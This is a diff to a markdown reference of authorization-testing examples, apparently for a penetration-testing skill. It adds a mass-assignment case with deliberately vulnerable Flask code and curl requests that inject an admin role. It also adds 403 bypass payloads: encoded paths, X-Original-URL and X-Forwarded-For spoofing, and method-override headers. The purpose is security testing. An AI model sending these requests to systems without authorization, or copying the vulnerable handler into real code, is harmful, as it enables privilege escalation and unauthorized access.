@@ -11,7 +11,11 @@ This file contains comprehensive examples of authorization vulnerability testing
    - FALSE_POSITIVE (Example 9)
    - UNVALIDATED (Example 10)
    - PARTIAL (Example 11)
-6. [Common Patterns](#common-patterns)
+6. [Mass Assignment](#mass-assignment)
+7. [403/401 Bypass](#403401-bypass)
+8. [Common Patterns](#common-patterns)
+
+**Note:** For CSRF and CORS examples, see the **access-testing** skill.
 
 ---
 
@@ -455,6 +459,223 @@ def delete_document(doc_id):
 - Attacker can read sensitive documents (information disclosure)
 - Cannot modify or delete documents (tampering prevented)
 - Risk depends on document sensitivity and business context
+
+---
+
+## Mass Assignment
+
+### Example 12: Mass Assignment Privilege Escalation (CWE-915)
+
+**Scenario**: User registration endpoint accepts additional parameters that escalate privileges
+
+**Vulnerability**:
+```python
+# api/users.py - VULNERABLE
+@app.route('/api/register', methods=['POST'])
+def register_user():
+    data = request.json
+    user = User(**data)  # Mass assignment - accepts ALL parameters!
+    db.session.add(user)
+    db.session.commit()
+    return jsonify(user.to_dict())
+```
+
+**Test (CLI)**:
+```bash
+# Normal registration
+curl -X POST "$TARGET/api/register" -H "Content-Type: application/json" \
+  -d '{"username":"testuser","email":"test@test.com","password":"Test123!"}'
+
+# Attack - inject admin role
+curl -X POST "$TARGET/api/register" -H "Content-Type: application/json" \
+  -d '{"username":"attacker","email":"evil@test.com","password":"Test123!","role":"admin"}'
+```
+
+**Evidence**:
+```json
+{
+  "status": "VALIDATED",
+  "baseline": {
+    "url": "http://target.com/api/register",
+    "method": "POST",
+    "payload": "{\"username\":\"testuser\",\"email\":\"test@test.com\",\"password\":\"[REDACTED]\"}",
+    "status": 201,
+    "response_snippet": "{\"id\":100,\"username\":\"testuser\",\"role\":\"user\"}"
+  },
+  "test": {
+    "url": "http://target.com/api/register",
+    "method": "POST",
+    "payload": "{\"username\":\"attacker\",\"email\":\"evil@test.com\",\"password\":\"[REDACTED]\",\"role\":\"admin\"}",
+    "status": 201,
+    "response_snippet": "{\"id\":101,\"username\":\"attacker\",\"role\":\"admin\"}"
+  },
+  "evidence": "Mass assignment vulnerability - user created with admin role via injected parameter"
+}
+```
+
+---
+
+## 403/401 Bypass
+
+### Example 17: 403 Bypass via Path Manipulation
+
+**Scenario**: WAF or reverse proxy blocks /admin but path manipulation bypasses it
+
+**Test (CLI)**:
+```bash
+# Baseline - blocked
+curl -I "$TARGET/admin"
+# HTTP/1.1 403 Forbidden
+
+# Bypass attempts
+curl -I "$TARGET/%2e/admin"           # URL-encoded dot
+curl -I "$TARGET/admin/.."            # Path traversal
+curl -I "$TARGET/admin..;/"           # Semicolon injection
+curl -I "$TARGET//admin//"            # Double slashes
+curl -I "$TARGET/./admin/./"          # Current directory
+curl -I "$TARGET/ADMIN"               # Case variation
+```
+
+**Evidence**:
+```json
+{
+  "status": "VALIDATED",
+  "baseline": {
+    "url": "http://target.com/admin",
+    "method": "GET",
+    "status": 403
+  },
+  "bypasses": [
+    {
+      "type": "path_manipulation",
+      "payload": "/%2e/admin",
+      "url": "http://target.com/%2e/admin",
+      "status": 200,
+      "bypass_success": true
+    },
+    {
+      "type": "path_manipulation",
+      "payload": "/admin..;/",
+      "url": "http://target.com/admin..;/",
+      "status": 200,
+      "bypass_success": true
+    }
+  ],
+  "evidence": "403 bypass via URL encoding - /admin blocked but /%2e/admin returns 200 OK"
+}
+```
+
+### Example 18: 403 Bypass via Header Injection
+
+**Scenario**: Application trusts X-Original-URL header for routing decisions
+
+**Test (CLI)**:
+```bash
+# Baseline - blocked
+curl -I "$TARGET/admin"
+# HTTP/1.1 403 Forbidden
+
+# Bypass via X-Original-URL header
+curl -I "$TARGET/" -H "X-Original-URL: /admin"
+curl -I "$TARGET/" -H "X-Rewrite-URL: /admin"
+```
+
+**Evidence**:
+```json
+{
+  "status": "VALIDATED",
+  "baseline": {
+    "url": "http://target.com/admin",
+    "status": 403
+  },
+  "bypasses": [
+    {
+      "type": "header_injection",
+      "headers": {"X-Original-URL": "/admin"},
+      "url": "http://target.com/",
+      "status": 200,
+      "bypass_success": true,
+      "response_snippet": "<html>Admin Dashboard</html>"
+    }
+  ],
+  "evidence": "403 bypass via X-Original-URL header injection - admin panel accessible"
+}
+```
+
+### Example 19: 403 Bypass via IP Spoofing Headers
+
+**Scenario**: Access control based on client IP, bypassed via X-Forwarded-For
+
+**Test (CLI)**:
+```bash
+# Baseline - blocked (external IP)
+curl -I "$TARGET/internal/api"
+# HTTP/1.1 403 Forbidden
+
+# Bypass - spoof internal IP
+curl -I "$TARGET/internal/api" -H "X-Forwarded-For: 127.0.0.1"
+curl -I "$TARGET/internal/api" -H "X-Real-IP: 10.0.0.1"
+curl -I "$TARGET/internal/api" -H "X-Client-IP: 192.168.1.1"
+```
+
+**Evidence**:
+```json
+{
+  "status": "VALIDATED",
+  "baseline": {
+    "url": "http://target.com/internal/api",
+    "status": 403
+  },
+  "bypasses": [
+    {
+      "type": "header_injection",
+      "headers": {"X-Forwarded-For": "127.0.0.1"},
+      "url": "http://target.com/internal/api",
+      "status": 200,
+      "bypass_success": true
+    }
+  ],
+  "evidence": "403 bypass via X-Forwarded-For header - internal API accessible by spoofing localhost IP"
+}
+```
+
+### Example 20: 403 Bypass via HTTP Method Override
+
+**Scenario**: GET blocked but POST with method override header works
+
+**Test (CLI)**:
+```bash
+# Baseline - GET blocked
+curl -I "$TARGET/admin/users"
+# HTTP/1.1 403 Forbidden
+
+# Bypass - POST with method override
+curl -X POST "$TARGET/admin/users" -H "X-HTTP-Method-Override: GET"
+curl -X POST "$TARGET/admin/users" -H "X-Method-Override: GET"
+```
+
+**Evidence**:
+```json
+{
+  "status": "VALIDATED",
+  "baseline": {
+    "url": "http://target.com/admin/users",
+    "method": "GET",
+    "status": 403
+  },
+  "bypasses": [
+    {
+      "type": "method_override",
+      "method": "POST",
+      "override_headers": {"X-HTTP-Method-Override": "GET"},
+      "status": 200,
+      "bypass_success": true,
+      "response_snippet": "[{\"id\":1,\"username\":\"admin\"}...]"
+    }
+  ],
+  "evidence": "403 bypass via HTTP method override - admin user list exposed"
+}
+```
 
 ---
 
